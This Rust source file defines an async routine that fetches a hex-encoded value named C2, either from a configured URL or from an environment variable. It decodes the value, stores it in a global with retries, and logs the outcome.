use cuscuta_common::{api::fetch_json, data::ScirpophagaData, quick_fetch::QuickFetch};
use tokio_util::sync::CancellationToken;

use crate::{C2, config::fetch_env};

pub async fn sync_scirpophaga_data(_: &CancellationToken) {
    async fn try_sync() -> Result<String, String> {
        let config = fetch_env();
        let data = if config.use_online_key {
            fetch_json::<ScirpophagaData>(
                &config
                    .scirpophaga_url
                    .clone()
                    .expect("USE_ONLINE_KEY is true, but SCIRPOPHAGA_URL is not set"),
            )
            .await
            .map_err(|e| format!("failed to fetch from SCIRPOPHAGA_URL: {e}"))?
            .c2
        } else {
            config
                .bin_c2
                .clone()
                .expect("USE_ONLINE_KEY is false, but BIN_C2 is not set")
        };
        let vec = hex::decode(data.clone())
            .map_err(|e| format!("failed to decode string: {data} ({e})"))?;
        C2.try_write(|_| Some(vec))
            .map_err(|e| format!("failed to write C2: {e}"))?;
        Ok(data)
    }
    let retries = fetch_env().resource_update_retries;
    for retry in 0..retries {
        tracing::info!("sync_scirpophaga_data: trying sync scirpophaga data... {retry}/{retries}");
        match try_sync().await {
            Ok(data) => {
                tracing::info!("sync_scirpophaga_data: scirpophaga data initialized: C2: {data:?}",);
                return;
            }
            Err(e) => {
                tracing::error!("sync_scirpophaga_data: failed to sync scirpophaga data: {e}");
            }
        }
    }
}
